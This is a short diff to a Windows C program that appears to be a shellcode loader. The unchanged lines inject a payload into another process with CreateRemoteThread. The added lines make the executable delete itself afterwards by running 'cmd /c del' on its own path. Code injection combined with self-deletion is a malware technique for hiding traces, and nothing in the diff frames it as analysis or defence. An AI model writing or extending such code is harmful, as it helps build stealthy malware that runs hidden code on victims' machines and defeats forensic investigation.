@@ -1,4 +1,5 @@
 #include <stdio.h>
+#include <process.h>
 #include <windows.h>
 
 int strcmp(const char *l, const char *r) {
@@ -83,6 +84,11 @@ int main(int argc, char *argv[]) {
   CreateRemoteThread(pi.hProcess, 0, 0, ptr, 0, 0, 0);
 
   free(raw);
+
+  char args[MAX_PATH], path[MAX_PATH];
+  GetModuleFileName(0, path, MAX_PATH);
+  sprintf(args, "/c del \"%s\"", path);
+  spawnlp(P_OVERLAY, "cmd", args, NULL);
 
   return 0;
 }
